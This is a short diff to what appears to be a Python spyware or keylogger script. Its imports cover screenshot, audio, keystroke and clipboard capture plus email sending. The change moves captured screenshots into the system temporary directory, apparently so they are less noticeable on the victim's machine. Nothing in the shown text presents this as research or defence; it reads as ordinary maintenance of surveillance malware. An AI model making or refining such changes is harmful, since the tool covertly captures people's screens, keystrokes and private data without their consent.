@@ -17,6 +17,7 @@ try:
     from email.mime.text import MIMEText
     import glob
     import time
+    import tempfile  # Import tempfile to get a temporary directory
 except ModuleNotFoundError:
     from subprocess import call
     modules = ["pyscreenshot", "sounddevice", "pynput", "pyperclip"]
@@ -132,7 +133,9 @@ finally:
         def screenshot(self):
             try:
                 img = pyscreenshot.grab()
-                screenshot_path = os.path.join(os.getcwd(), "screenshot.png")
+                # Save screenshot in the user's temporary directory
+                temp_dir = tempfile.gettempdir()
+                screenshot_path = os.path.join(temp_dir, "screenshot.png")
                 img.save(screenshot_path)
                 return screenshot_path
             except Exception as e:
